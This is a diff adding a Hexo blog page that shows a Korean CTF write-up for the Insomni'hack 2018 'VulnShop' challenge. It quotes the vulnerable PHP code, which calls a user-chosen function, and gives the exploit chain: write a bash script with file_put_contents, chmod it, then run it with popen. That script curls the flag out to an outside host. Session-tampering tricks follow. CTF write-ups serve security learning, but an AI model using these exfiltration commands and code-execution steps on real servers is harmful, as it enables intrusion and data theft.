@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>KiraSys</title>
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>KiraSys</div>
+        
+            <div>CAT-Security</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/kirasys">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+            
+                <a href="https://www.facebook.com/profile.php?id=100008635065103">
+                    <img src="/assets/facebook.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <ul class="Index">
+  
+    <header class='PageTitle'>
+        <h1>{ Web }</h1>
+    </header>
+  
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2018/01/26/Insomni-hack-teaser-2018-VulnShop/">Insomni&#39;hack teaser 2018 - VulnShop</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2018-01-26T04:05:09.000Z" itemprop="datePublished">
+    2018-01-26
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/web/">Web</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'answer'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]) &amp;&amp; function_exists($_REQUEST[<span class="string">'method'</span>]))&#123; </span><br><span class="line">   $_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>disabled된 함수인 shell_exec, exec, passthru, mail, proc_open을 제외한 함수를 실행시킬 수 있다. 첫 번째 인자에는 /tmp 에 생성되는 파일 이름이 들어가고, 두번째 인자는 사용자에게 입력받는다.<br><br><br></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'contactus'</span>: </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span>; </span><br><span class="line">	$_SESSION[<span class="string">'challenge'</span>] = rand(<span class="number">100000</span>,<span class="number">999999</span>); </span><br><span class="line">	<span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'captcha'</span>: </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'challenge'</span>])) <span class="keyword">echo</span> $_SESSION[<span class="string">'challenge'</span>]; </span><br><span class="line">    <span class="comment">// Will make an image later </span></span><br><span class="line">    touch($_SESSION[<span class="string">'challenge'</span>]); </span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>먼저 contactus -&gt; captcha를 통해 임시 파일을 하나 생성한다. 생성한 파일은 file_put_contents 함수를 이용해서 파일에 데이터를 쓸 수 있다.<br><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        file_put_contents(<span class="string">'./1234'</span>,<span class="string">"#!/bin/bash\ncurl a/ex.php?data=`cat /flag`"</span>);</span><br><span class="line">        chmod(<span class="string">'./1234'</span>,<span class="string">"511"</span>);</span><br><span class="line">        popen(<span class="string">'./1234'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>처음에는 require을 통해 php 소스를 불러올려 했는데 2번째 인자 때문에 정상적으로 실행되지 않아서 popen을 통해 공격하였다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl myweb/ex.php?=`cat flag`</span><br></pre></td></tr></table></figure></p>
+<p>위의 스크립트를 file_put_contents 함수를 통해 넣어주고 chmod로 파일 실행 권한을 추가해주면 popen을 통해 실행시킬 수 있다.<br><br><br></p>
+<h3 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h3><ul>
+<li>curl을 통해 flag를 보내는 방법말고 highlight_file 함수와 두번째 인자를 그냥 null로 주면 파일을 바로 읽어서 출력할 수 있다.</li>
+<li>phpinfo에서 session이 저장되는 경로를 알아낼 수 있고, copy 함수로 세션을 조작할 수 있다. 먼저 로컬 환경에서 php 명령어를 저장한 변수($_SESSION[‘challenge’] = ‘vardump(scandir(“$_GET[a]”)))를 session에 저장하고 해당 파일을 출력해 값을 알아낸다. file_put_contents 함수로 로컬에서 얻은 세션 값을 저장하고 문제 사이트의 쿠키 값을 참조하여 copy 함수를 통해 세션을 조작할 수 있다.</li>
+</ul>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+</ul>
+
+
+            <footer>
+    <div>© 2016 - kirasys </div>
+    <div>
+    Powered by Hexo
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
